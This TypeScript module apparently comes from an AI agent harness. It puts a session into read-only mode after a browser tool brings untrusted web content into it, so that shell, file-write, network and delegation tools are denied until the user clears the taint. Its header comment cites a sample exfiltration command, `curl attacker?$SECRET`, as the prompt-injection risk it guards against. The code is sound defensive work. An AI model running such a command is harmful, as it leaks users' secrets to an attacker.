/**
 * Host-side session taint: once untrusted web content entered an agent
 * session through a browser tool (or an injected follow snapshot), that
 * session runs read-only for the harness tools until the user clears it in
 * the extension panel.
 *
 * Mechanism: a monotonic `ctx.tools.guard` (dsh-tools) — evaluated after every
 * `tools/pre-execute` listener and approval, and unable to be turned back into
 * an allow by listener ordering — denies every non-allowlisted tool for a
 * tainted session. This is stricter than `setSandboxMode(session, 'read-only')`
 * and deliberately chosen over it:
 *
 * - a read-only sandbox still runs `bash` (so `curl attacker?$SECRET` works)
 *   and leaves `web_fetch`, subagents, schedules, and plugin tools untouched;
 * - `setSandboxMode` appends a durable `sandbox/mode` event, and the user's
 *   previous override could not be restored exactly on clear.
 *
 * Allowed while tainted: read-only file tools, planning/question tools, and the
 * `browser_*` tools (the extension gates those itself with its own taint
 * rules). Everything else — shell, file writes, network fetches, delegation
 * (a child agent would not inherit the taint), schedules, MCP and other plugin
 * tools — is denied with a message that tells the model how the user can lift
 * the restriction.
 *
 * State is in memory: a Host restart forgets the taint (the extension's own
 * taint, persisted in chrome.storage.session, still applies on the browser
 * side). Fail-closed alternatives would brick every session after a restart.
 *
 * @module @natgurlain/dsh-bridge-browser/src/session-taint
 */

import type { Context } from '@deepseek-ai/cordis'
import type {} from '@deepseek-ai/dsh-tools'
import type { BrowserHostApi, HostRpcCall, HostRpcResult } from './host-api.ts'
import { isRecord } from './host-api.ts'
import { BRIDGE_TAINT_CLEAR_METHOD } from './protocol.ts'

/** Tools a tainted session may still run (read-only or user-facing). */
export const TAINT_ALLOWED_TOOLS: ReadonlySet<string> = new Set([
  'read',
  'read_image',
  'glob',
  'grep',
  'todo_write',
  'ask_user_question',
  'get_goal',
  'list_agents',
  'list_subagent_models',
  'job_list',
  'job_output',
  'schedule_list',
  'schedule_view',
  'team_task_get',
  'team_task_list',
  'session_event_read',
  'session_event_search',
  'session_event_trace',
  'session_search',
  'session_trace',
])

/** Browser tool results that never quote a page. Mirrors the extension's list. */
const CONTENT_FREE_TOOLS: ReadonlySet<string> = new Set([
  'browser_devtools_network',
  'browser_follow_tab',
  'browser_close_tab',
])

/** Whether a tool may run in a tainted session. */
export function toolAllowedWhileTainted(name: string): boolean {
  return TAINT_ALLOWED_TOOLS.has(name) || name.startsWith('browser_')
}

/** Whether a successful tool result taints its session. */
export function resultTaintsSession(name: string, isError: boolean): boolean {
  return !isError && name.startsWith('browser_') && !CONTENT_FREE_TOOLS.has(name)
}

export interface TaintEntry {
  firstTool: string
  since: number
}

/** In-memory taint per agent session id. */
export class SessionTaintRegistry {
  private readonly entries = new Map<string, TaintEntry>()

  constructor(private readonly now: () => number = Date.now) {}

  mark(sessionId: string, tool: string): void {
    if (!this.entries.has(sessionId)) this.entries.set(sessionId, { firstTool: tool, since: this.now() })
  }

  clear(sessionId: string): boolean {
    return this.entries.delete(sessionId)
  }

  get(sessionId: string): TaintEntry | undefined {
    return this.entries.get(sessionId)
  }

  isTainted(sessionId: string): boolean {
    return this.entries.has(sessionId)
  }
}

/** Model-facing reason for a denied tool in a tainted session. */
export function taintDenialReason(name: string): string {
  return `Tool "${name}" is disabled in this session: it has read untrusted web page content, so shell, file-writing, `
    + 'network, and delegation tools are off (read-only) until the user clears the session in the browser panel '
    + '("Clear" on the untrusted-content banner). Do not retry; tell the user what you need and why.'
}

interface ToolsWithGuard {
  guard?: (guard: (exec: { name: string; agent?: { id: unknown } }) => string | undefined) => () => void
}

/**
 * Observe browser tool results and guard every other tool of a tainted
 * session. Returns the disposer for both.
 */
export function installSessionTaint(ctx: Context, registry: SessionTaintRegistry): () => void {
  const disposers: Array<() => void> = []
  disposers.push(ctx.on('tools/result', (exec, result) => {
    const sessionId = exec.agent === undefined ? undefined : String(exec.agent.id)
    if (sessionId !== undefined && resultTaintsSession(exec.name, result.isError)) registry.mark(sessionId, exec.name)
    return undefined
  }))
  const denial = (exec: { name: string; agent?: { id: unknown } }): string | undefined => {
    if (exec.agent === undefined) return undefined
    if (!registry.isTainted(String(exec.agent.id)) || toolAllowedWhileTainted(exec.name)) return undefined
    return taintDenialReason(exec.name)
  }
  const tools = ctx.tools as unknown as ToolsWithGuard | undefined
  if (typeof tools?.guard === 'function') {
    disposers.push(tools.guard(denial))
  } else {
    // Older registries: the pre-execute waterfall still denies (weaker only
    // in that an earlier listener could short-circuit it).
    disposers.push(ctx.on('tools/pre-execute', async (exec, next) => {
      const reason = denial(exec)
      return reason === undefined ? next() : { kind: 'deny', reason }
    }))
  }
  return () => { for (const dispose of disposers.reverse()) dispose() }
}

/** Parse the clear payload: `{ sessionId: string | null }`. */
function clearPayload(payload: unknown): { sessionId?: string } | undefined {
  if (!isRecord(payload)) return undefined
  if (payload.sessionId === null || payload.sessionId === undefined) return {}
  return typeof payload.sessionId === 'string' && payload.sessionId !== '' ? { sessionId: payload.sessionId } : undefined
}

/**
 * Serve {@link BRIDGE_TAINT_CLEAR_METHOD} at the bridge (never forwarded to
 * the Host). Clearing only lowers this bridge's own restriction, and only the
 * extension panel's explicit Clear sends it.
 */
export function withTaintMethods(
  api: BrowserHostApi,
  registry: SessionTaintRegistry,
  allowsSession?: (sessionId: string, signal: AbortSignal) => Promise<boolean>,
): BrowserHostApi {
  return {
    call: async (call: HostRpcCall): Promise<HostRpcResult> => {
      if (call.method !== BRIDGE_TAINT_CLEAR_METHOD) return api.call(call)
      const payload = clearPayload(call.payload)
      if (payload === undefined) {
        return { ok: false, error: { code: 'bad-request', message: 'sessionId must be a non-empty string or null', details: {} } }
      }
      if (payload.sessionId !== undefined && allowsSession !== undefined
        && !await allowsSession(payload.sessionId, call.signal).catch(() => false)) {
        return { ok: false, error: { code: 'forbidden', message: `session ${JSON.stringify(payload.sessionId)} is not available to the browser bridge`, details: {} } }
      }
      const cleared = payload.sessionId === undefined ? false : registry.clear(payload.sessionId)
      return { ok: true, value: { cleared } }
    },
    events: (signal) => api.events(signal),
    respond: (rpcId, result, signal) => api.respond(rpcId, result, signal),
  }
}
